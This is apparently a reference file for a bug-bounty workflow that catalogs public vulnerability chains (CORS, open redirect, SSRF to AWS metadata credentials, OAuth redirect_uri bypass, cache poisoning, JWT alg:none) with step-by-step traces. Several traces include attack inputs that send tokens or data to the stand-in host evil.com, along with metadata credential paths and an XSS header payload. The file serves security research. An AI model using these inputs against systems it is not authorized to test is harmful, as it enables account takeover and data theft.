# Canonical Chain Examples

> Real chains from publicly disclosed reports, conference talks, and security research. Each shows the gadgets, the trace, the impact, and (where known) the payout. Reference these when constructing chain hypotheses to validate that the pattern is real and accepted.

These are NOT exhaustive. They are the canonical patterns — examples that demonstrate the technique cleanly enough to model future hypotheses on. When you see a chain in this file, the pattern has been validated by triage and paid; it is a known-good template.

---

## Example 1 — Open Redirect + CSPT → Full ATO (Bugcrowd gadget article)

**Source:** Bugcrowd LevelUpX, "How to find bugs on a hardened target using gadgets" — https://www.bugcrowd.com/blog/how-to-find-bugs-on-a-hardened-target-using-gadgets/

**Gadgets in chain:**
- G-α: Open redirect on `/api/util/redirect?url=` — P4 alone
- G-β: Client-side path traversal (CSPT) on dashboard's `username` parameter — P4 alone
- G-γ: Dashboard injects API response into DOM without sanitization (HTMLi) — P4 alone
- G-δ: Profile update via GET (POST-to-GET conversion) — P4 alone

**Forward trace:**
1. Victim clicks `target.com/dashboard?username=../util/redirect?url=evil.com/payload.json`
2. Dashboard JS fetches `/api/profile/../util/redirect?url=evil.com/payload.json` (CSPT resolves the path)
3. Server responds with 302 redirect to `evil.com/payload.json` (open redirect)
4. Browser follows redirect (fetch follows by default), retrieves attacker JSON
5. Dashboard JS treats response as profile data and injects into DOM
6. JSON includes `<img onerror>` payload — XSS fires
7. XSS issues `GET /api/account/update?email=attacker@evil.com` (POST-to-GET gadget)
8. Email changed → password reset → ATO

**Impact:** Full ATO, 1-click on victim.
**Severity:** Bugcrowd lists as P1/P2 territory.
**Why it's instructive:** Every single gadget alone is P4 (Informational/Low). The chain is P1. Five P4 reports = 0 dollars. One chained P1 report = full bounty.

---

## Example 2 — Path Traversal + DLL Hijacking → RCE — $111,750

**Source:** Meta BountyCon 2024, Abhishek meena writeup — https://infosecwriteups.com/chaining-path-traversal-vulnerability-to-rce-metas-111-750-bug-a98a473c6a05

**Target:** Facebook Messenger for Windows

**Gadgets:**
- G-α: Path traversal in E2EE file-sharing feature — allowed placing files in arbitrary paths on victim's Windows machine
- G-β: Messenger.exe loads DLL via `LoadLibrary` from a path that includes a user-writable directory

**Forward trace:**
1. Attacker sends E2EE file with traversal payload in filename
2. Messenger client writes the file to attacker-chosen Windows path
3. Attacker plants malicious DLL in a `LoadLibrary` search-path directory
4. Next time Messenger loads the DLL → RCE on victim's machine

**Impact:** RCE on victim's machine via single message.
**Bounty:** $111,750 — first place at the event.
**Why it's instructive:** Path traversal alone, especially in a chat client, would likely be Medium ($1K-$5K). DLL hijacking requires a write primitive, which is exactly what path traversal provides. The chain produces RCE.

---

## Example 3 — Starbucks BFF Proxy Traversal → 100M Customer Records (Sam Curry)

**Source:** Sam Curry's writeup — https://samcurry.net/hacking-starbucks

**Gadgets:**
- G-α: BFF (Backend-For-Frontend) proxy endpoint at `/bff/proxy/orchestra/`
- G-β: Proxy accepts path traversal characters in routes
- G-γ: Internal `Microsoft Graph` instance behind the proxy with admin-tier access to customer DB

**Forward trace:**
1. Identify `/bff/proxy/orchestra/get-user` exists and routes to internal service
2. Find an endpoint that takes user input — `/bff/proxy/stream/v1/me/streamItems/<id>` — gives traversal surface
3. Use traversal to reach the internal Microsoft Graph proxy: `/bff/proxy/stream/v1/me/streamItems/..%2f..%2fgraph%2fusers`
4. Internal call returns Graph data for any user
5. Pivot to mass enumeration

**Impact:** Access to names, emails, phone numbers, addresses of ~100M Starbucks customers.
**Severity:** Critical. Bounty undisclosed but at the Critical tier for Starbucks.
**Why it's instructive:** This is the "secondary contexts" attack pattern. BFF / proxy / gateway endpoints are everywhere in modern microservice architectures, and almost all of them have traversal flaws. The gadget is the proxy itself. The amplifier is internal-only services that trust the proxy's source.

---

## Example 4 — CORS Misconfiguration → CSRF Token Leak → CSRF ATO

**Source:** Mustafa Adam writeup — https://wadgamaraldeen.medium.com/from-cors-misconfigration-to-csrf-account-takeover-ce5d85f41eda

**Gadgets:**
- G-α: CORS misconfiguration on `/auth/forgotpassword` — reflects arbitrary `Origin` with `Credentials: true` (rejected as P5 "informative" alone)
- G-β: CSRF on `/site/profile` (Update Profile) — uses CSRF tokens but no Origin/Referer validation

**Forward trace:**
1. Victim visits attacker.com while logged into target.com
2. attacker.com JavaScript makes credentialed XHR to `/auth/forgotpassword`
3. CORS misconfig allows attacker.com to read response, which contains a CSRF token
4. attacker.com uses the leaked CSRF token to POST to `/site/profile` with attacker email
5. Email changed → password reset → ATO

**Impact:** Account takeover.
**Severity:** Originally closed informative for the CORS bug alone. Reopened and triaged as Medium (6.5) when chain demonstrated.
**Why it's instructive:** This is the **exact pattern Vaibhav should apply to FIND-301 (CORS_Misconfiguration on /api/kramer/v0/in-app-notification)**. If the same CORS issue is present on an endpoint that leaks a CSRF token, session token, or PII, the finding becomes impactful. If not — the finding stays informative.

The lesson: **never report CORS alone**. The first thing the chaining process must do for any CORS finding is search the inventory for sensitive endpoints under the same misconfig.

---

## Example 5 — 1-Click ATO via CORS Misconfig + Open Redirect (Bugcrowd private)

**Source:** Muhammed Mubarak writeup — https://medium.com/@mohammed01550038865/1-click-account-takeover-ato-via-cors-misconfiguration-64dc26d24917

**Gadgets:**
- G-α: Open redirect on `/sign-in?callbackUrl=` accepting `//evil.com` (P4 alone)
- G-β: Reflected XSS via `javascript:` scheme in callbackUrl (the open redirect's amplifier)
- G-γ: `/api/auth/session` endpoint returning access token in JSON response
- G-δ: CORS reflection on `/api/auth/session`

**Forward trace:**
1. Confirm open redirect: `/sign-in?callbackUrl=////////evil.com` → P4
2. Escalate to XSS: `/sign-in?callbackUrl=javascript:alert(1)` → P3
3. Find the auth token leak via fuzzing — `/api/auth/session` returns access token
4. Confirm CORS reflection: `Origin: evil.com` + `Credentials: true` echoed
5. Combined attack: attacker.com fetches `/api/auth/session` cross-origin → token captured → API access as victim

**Impact:** Account takeover, 1-click on victim.
**Severity:** P2.
**Why it's instructive:** Each gadget added impact:
- Open redirect alone: P4 (~$0)
- + XSS: P3 (~$300)
- + CORS + token-leak endpoint: P2 (typically $1K-$5K)

The hunter walked the inventory and incrementally chained. Note also: the hunter "started looking at the Burp history and began fuzzing" — that's how `/api/auth/session` was found. **Source-map and JS-bundle enumeration would have surfaced this endpoint during the spider phase**, which is exactly Vaibhav's Phase 1 augmentation goal.

---

## Example 6 — Self-XSS + Login CSRF + Account Switch → ATO

**Source:** Vitor Falcao writeup — https://vitorfalcao.com/posts/hacking-high-profile-targets/

**Gadgets:**
- G-α: CSPT gadget that enabled self-XSS (in attacker's own account context)
- G-β: CSRF in OAuth login mechanism (no `state` parameter or weak validation)
- G-γ: Same-browser session handling that switched between accounts

**Forward trace:**
1. Attacker plants self-XSS in their own account profile
2. Attacker crafts a page on attacker.com
3. Page contains CSRF that logs victim into ATTACKER's account
4. Victim is now in attacker's session
5. Victim's browser fetches attacker's profile → self-XSS fires
6. XSS triggers a request that switches the session back to victim's own account (the limitation Vitor found requires user interaction here, dropping CVSS from Critical to High)
7. XSS, now in victim's authenticated context, performs ATO actions (email change, password change, MFA disable)

**Impact:** Account takeover, requires victim to visit attacker.com.
**Severity:** High (would have been Critical without the interaction requirement).
**Why it's instructive:** This is the canonical "self-XSS is never useless" chain. Most hunters drop self-XSS as P5. Vitor's chain shows that with a login CSRF amplifier and a context-switch primitive, self-XSS becomes ATO. The chain has three components, none of which would be reportable alone.

---

## Example 7 — SSRF → IMDSv1 → IAM Credentials → S3 (Capital One)

**Source:** Capital One 2019 breach (post-mortem published by AWS, US DOJ filings), also documented as a bug-bounty chain pattern in dozens of writeups including hg8.sh — https://hg8.sh/posts/bugbounty/ssrf-to-rce-aws/

**Gadgets:**
- G-α: SSRF in a WAF running on EC2
- G-β: EC2 instance with IMDSv1 enabled (default at the time)
- G-γ: IAM role attached to EC2 with broad S3 read permissions

**Forward trace:**
1. SSRF: send request through the WAF that targets `http://169.254.169.254/latest/meta-data/`
2. IMDSv1 responds with metadata
3. Fetch IAM role name: `/latest/meta-data/iam/security-credentials/`
4. Fetch role credentials: `/latest/meta-data/iam/security-credentials/<role-name>`
5. Configure AWS CLI with the stolen `AccessKeyId`, `SecretAccessKey`, `Token`
6. List buckets, exfil customer records

**Impact:** 100M customer records exfiltrated.
**Severity:** Critical.
**Why it's instructive:** The vulnerability was NOT exotic. It was the canonical SSRF → IMDSv1 chain. Capital One had a sophisticated security program, multiple compliance certifications, and dedicated AppSec. They missed this because they thought of SSRF as a Medium-severity bug. The chain to IMDS is now famous, and IMDSv2 was added to AWS as a direct response — but tens of thousands of EC2 instances still default to IMDSv1.

The bug bounty version of this chain: same components, but the bounty is for the SSRF + IMDS pair before an attacker exfils anything. CVSS profile in bug-bounty reports for "SSRF to AWS credential theft via IMDSv1" consistently scores 8.8-9.8 (CVSS 3.1).

---

## Example 8 — Grafana CVE-2025-4123 — Open Redirect + Plugin Installer → Stored XSS

**Source:** Ionix writeup — https://www.ionix.io/blog/grafana-cve-2025-4123-open-redirect-stored-xss-patch/

**Gadgets:**
- G-α: Open redirect in Grafana's plugin installer URL fetching
- G-β: Plugin installer trusts the redirected-to content
- G-γ: Stored XSS sink when plugin content is rendered in Grafana

**Forward trace:**
1. Attacker hosts malicious plugin with JS payload on external host
2. Attacker triggers plugin install with URL pointing to legitimate-looking domain that open-redirects to attacker's host
3. Grafana's plugin installer follows the redirect (open redirect gadget)
4. Plugin content (with attacker JS) is loaded into Grafana as a "trusted" plugin
5. Stored XSS persists in Grafana instance

**Impact:** Stored XSS on Grafana instances, persistent.
**Why it's instructive:** This is "Open Redirect + Bypass Domain Restrictions" from the Bugcrowd article — open redirects let you load attacker content from within the target's origin context. Whenever an app fetches external content based on user input and the fetcher follows redirects, open redirect is the amplifier.

---

## Example 9 — Subdomain Takeover + Wide Cookie Scope → ATO (Pattern, not single report)

**Source:** Pattern documented across many disclosed reports; see HackerOne hacktivity searches for "subdomain takeover" + "cookie" + "ATO". Bugbounty.info CORS reference also covers — https://bugbounty.info/Attack-Surface/Web/Client-Side/CORS

**Gadgets:**
- G-α: Subdomain pointing to unclaimed cloud resource (Heroku, Azure, S3, GitHub Pages, Fastly, etc.)
- G-β: Session cookie set with `Domain=.target.com` (wider than necessary)

**Forward trace:**
1. Attacker claims the unclaimed cloud resource — now owns `subdomain.target.com`
2. Victim visits `subdomain.target.com` (phished or via XSS link)
3. Browser sends `target.com`-domain cookies (including session) to attacker's controlled subdomain
4. Attacker's web server logs the cookies → ATO

**Impact:** Account takeover.
**Severity:** Typically High to Critical.
**Why it's instructive:** This is the simplest, most universal chain. The attacker needs only: (1) a subdomain takeover (which can be done via passive recon on any DNS data), and (2) a wide cookie scope (which is a common default in legacy applications). Modern apps with `Domain=specific.target.com` are immune; legacy apps are not.

---

## Example 10 — Chaining CORS by Reflected XSS to ATO

**Source:** Santosh Kumar Sha — https://notifybugme.medium.com/chaining-cors-by-reflected-xss-to-account-takeover-my-first-blog-5b4f12b43c70

**Gadgets:**
- G-α: CORS misconfiguration on PII endpoint
- G-β: Reflected XSS on a different endpoint on the same origin

**Forward trace:**
1. Attacker crafts XSS payload that includes credentialed fetch to the PII endpoint
2. Victim visits attacker URL → XSS fires
3. XSS makes credentialed cross-origin request to PII endpoint
4. CORS misconfig allows the read
5. PII or auth material exfilled to attacker → leveraged into ATO

**Impact:** Account takeover.
**Why it's instructive:** This is XSS amplified by CORS, not CORS amplified by XSS. The CORS misconfig made the XSS more dangerous than it would normally be — instead of stealing only DOM accessible in the XSS context, it could now read protected cross-origin endpoints.

---

## Example 11 — OAuth Open Redirect + redirect_uri Bypass

**Source:** Common pattern, documented in many places; clean reference is YesWeHack's OAuth guide and PortSwigger's OAuth labs.

**Gadgets:**
- G-α: OAuth flow on the target
- G-β: `redirect_uri` validation by domain prefix (not exact match)
- G-γ: Any open redirect on the target's domain

**Forward trace:**
1. Attacker crafts: `target.com/oauth/authorize?client_id=...&redirect_uri=https://target.com/openredirect?next=https://evil.com`
2. Victim clicks. Target validates `redirect_uri` starts with `https://target.com` → passes
3. OAuth grant completes
4. Target redirects to `https://target.com/openredirect?next=https://evil.com`
5. Open redirect redirects to evil.com
6. Browser follows, with `?code=...` (or `#access_token=...`) appended to URL
7. Attacker server captures the code/token, exchanges for access
8. Attacker now has victim's OAuth token → ATO

**Impact:** Full ATO via 1-click.
**Why it's instructive:** This chain is so common it has a name: "OAuth open redirect attack." The PortSwigger Web Security Academy has a lab for exactly this pattern. Many hunters report the open redirect alone as P4 — completely missing that an OAuth flow with weak `redirect_uri` validation makes it a P1.

---

## Example 12 — Cache Poisoning + XSS (PortSwigger Research Pattern)

**Source:** James Kettle (albinowax), PortSwigger Research — https://portswigger.net/research/practical-web-cache-poisoning

**Gadgets:**
- G-α: A cacheable response that reflects an unkeyed input (a header, a parameter the cache strips before keying)
- G-β: That reflection happens in an executable context (HTML, JS string, attribute)

**Forward trace:**
1. Identify the unkeyed input via Param Miner (PortSwigger extension) — typically headers like `X-Forwarded-Host`, `X-Original-URL`, `X-Wap-Profile`
2. Confirm the reflection: `X-Forwarded-Host: evil.com<script>alert(1)</script>` → reflected in the response, ends up cached
3. Force cache miss + repopulate with poisoned response
4. Victims accessing the same URL get the poisoned (XSS) response from cache

**Impact:** Persistent XSS for all users hitting the cached endpoint.
**Severity:** Critical (mass user impact, no per-victim interaction beyond visiting the cached page).
**Why it's instructive:** Reflected XSS via header injection on its own is typically P3 (Medium) — limited because the attacker must control the header somehow. Cache poisoning makes it P1 — the cache delivers the attacker's payload to every visitor for free.

---

## Example 13 — JWT `alg: none` + IDOR-Like Claim Manipulation

**Source:** Universal pattern; canonical reference is Auth0's JWT security guidance and PortSwigger's JWT labs.

**Gadgets:**
- G-α: Server-side JWT validation accepts `alg: none` (or weak verification logic)
- G-β: JWT claims include identity information (`sub`, `user_id`, `role`)

**Forward trace:**
1. Decode the JWT from any authenticated session
2. Modify the payload: change `user_id` to victim's ID, or `role` to `admin`
3. Modify the header: `alg: none`
4. Sign with empty signature
5. Send forged JWT in `Authorization: Bearer ...` header
6. Server treats request as the victim or as admin

**Impact:** ATO or privilege escalation.
**Why it's instructive:** JWT `alg: none` is still found in 2024+ in libraries, custom implementations, and forgotten middleware. The chain is mechanical: confirm `alg: none` accepted (test by submitting a token with `alg: none` and no signature), then claim manipulation gives ATO. Same primitive but `alg: HS256` accepting public RSA key as secret works similarly.

---

## Example 14 — File Upload + SVG XSS (Common Pattern)

**Source:** Multiple disclosed reports; consolidated in HackerOne Hacktivity under "stored XSS via SVG upload"

**Gadgets:**
- G-α: File upload accepts SVG files
- G-β: Uploaded SVG served with `Content-Type: image/svg+xml`
- G-γ: Uploaded files served from the same origin as the main app

**Forward trace:**
1. Craft SVG with embedded `<script>` payload
2. Upload via the "image" upload feature
3. SVG is stored, served at `/uploads/<id>.svg`
4. Victim opens the SVG URL (often delivered via comment with image embed)
5. Browser renders SVG with script execution because content-type is SVG and origin matches

**Impact:** Stored XSS, often affecting multiple users.
**Severity:** Medium to High depending on which contexts render the SVG.
**Why it's instructive:** Many programs treat "image upload" as low-risk because they validate the magic bytes. SVG breaks that assumption — SVG is XML with script execution. The chain is uploaded → served → rendered in a privileged context.

---

## Example 15 — Mass Assignment + IDOR → Cross-User Role Escalation

**Source:** Pattern documented in OWASP API Top 10 (BOLA + Mass Assignment combinations) and many HackerOne reports.

**Gadgets:**
- G-α: Write IDOR on a user-update endpoint (`PATCH /api/users/<id>`)
- G-β: Mass assignment accepts a `role` or `is_admin` field on that endpoint

**Forward trace:**
1. Identify the user-update endpoint accepts arbitrary user IDs (write IDOR)
2. Test mass assignment by adding `role: admin` to update body
3. Successfully change any user's role
4. Promote attacker to admin, or demote a victim admin and promote self

**Impact:** Tenant-wide privilege escalation.
**Severity:** Critical.
**Why it's instructive:** Each gadget alone is moderate:
- IDOR on user update: Medium-High depending on what fields can be changed
- Mass assignment on role: only matters if you can actually invoke it on a victim record

Together, they're Critical. Many APIs have this combined flaw because backend models share user fields between admin endpoints and regular user endpoints — the API designer thought "I'll validate the role server-side" but forgot to validate it on the same model used for user self-update.

---

## Example 16 — Stored XSS in Admin View via Support Ticket → Admin ATO

**Source:** Pattern; reference one example at https://hackerone.com/reports/426147 and many others under "stored XSS support form ATO admin"

**Gadgets:**
- G-α: Support ticket form (or similar admin-readable user-input surface)
- G-β: Admin views tickets in a context where user input is rendered without sanitization
- G-γ: Admin in-session has CSRF tokens / API keys / session cookies accessible to JavaScript

**Forward trace:**
1. Attacker submits a support ticket with stored XSS payload in the body
2. Admin reads the ticket in admin panel
3. XSS executes in admin's authenticated context
4. XSS exfils admin cookies or performs CSRF-protected admin actions
5. Admin compromised → escalation

**Impact:** Admin account takeover.
**Severity:** Critical.
**Why it's instructive:** Self-impact stored XSS in user-to-admin surfaces is one of the most consistently paid chains in bug bounty. Almost every SaaS application has a "contact us" or support ticket form that admins read. If sanitization is incomplete, the chain to admin ATO is short.

---

## Example 17 — Headless Browser SSRF → RCE via `--no-sandbox`

**Source:** Pattern, documented at https://www.yeswehack.com/learn-bug-bounty/server-side-request-forgery-ssrf and multiple disclosed reports

**Gadgets:**
- G-α: A feature using headless Chromium for rendering (PDF export, screenshot service, link preview, OG-card generator)
- G-β: Chromium running with `--no-sandbox` flag inside Docker (common misconfig)
- G-γ: Attacker can supply HTML content to the renderer (directly or via URL fetch)

**Forward trace:**
1. Identify the renderer feature
2. Submit attacker-controlled HTML (or URL pointing to attacker HTML)
3. Renderer fetches and renders
4. Attacker HTML contains JS that exploits a known Chromium CVE OR uses `file://` to read host files OR uses Puppeteer's full HTTP control to reach internal services
5. Without sandbox, attacker code escapes to host shell

**Impact:** RCE on the renderer host.
**Severity:** Critical.
**Why it's instructive:** "PDF export" and "link preview" features look benign. They are extremely commonly vulnerable. The combination of headless browser + `--no-sandbox` + attacker HTML is one of the most direct paths from web-app surface to RCE.

---

## Example 18 — GraphQL Introspection + Hidden Mutation Chain

**Source:** Pattern; many disclosed reports under "graphql introspection" + "privilege escalation"

**Gadgets:**
- G-α: GraphQL endpoint with introspection enabled in production
- G-β: Schema includes mutations or fields the REST API doesn't expose
- G-γ: Hidden mutations lack per-field authorization

**Forward trace:**
1. Run introspection query → full schema
2. Identify mutations like `setUserRole`, `transferOwnership`, `impersonate`, `internal_*`
3. Test directly — many such mutations are present because they're admin-internal but unprotected
4. Execute privileged action

**Impact:** Varies by exposed mutation — typically privilege escalation or data tampering.
**Severity:** High to Critical.
**Why it's instructive:** REST surface enumeration misses GraphQL. When a target has both, GraphQL frequently exposes capabilities the REST API hides because devs forgot to apply authorization to schema fields.

---

## Patterns That Repeatedly Appear

After cataloging chains across thousands of disclosed reports, certain patterns dominate:

1. **The CORS chain.** CORS misconfig → endpoint returning sensitive data → ATO. Documented in dozens of disclosed reports. The Cleartax FIND-301 falls into this pattern — find the sensitive endpoint or the finding stays informative.

2. **The OAuth chain.** Open redirect + permissive redirect_uri = ATO. Stable for over a decade.

3. **The SSRF cloud chain.** SSRF + IMDSv1 = IAM credentials = mass data exposure. Still applicable in 2024+ because IMDSv1 remains the default in many deployments.

4. **The self-XSS chain.** Self-XSS + login CSRF + context switch = ATO. Discovered repeatedly under different framings.

5. **The subdomain trust chain.** Subdomain takeover + wide cookie scope or CORS trust = ATO.

6. **The mass-assignment privilege chain.** Mass assignment + IDOR + role field = tenant compromise.

7. **The Sam Curry proxy chain.** BFF/proxy/gateway + traversal + internal service = mass exfiltration.

8. **The cache amplifier.** Cache poisoning + reflected XSS = persistent XSS for all users.

These eight patterns account for the majority of high-value chained bounties. When backward-synthesizing, walk these first.

---

## How to Use This File During Phase 2

After building the gadget inventory:

1. Scan this file for chains whose components match your inventory.
2. For each matching chain, write a chain hypothesis (Phase 4 Step 4.1).
3. For chains that match all but one component, send a probe task to identify whether the missing component exists.
4. Reference the cited URL in your hypothesis file so the Phase 5 report writer can include it as supporting evidence (similar patterns paid).

These are not the only chains. They are the canonical patterns. Many engagements will produce novel chains. The novel chains usually combine these primitives in new ways — the patterns are the building blocks.
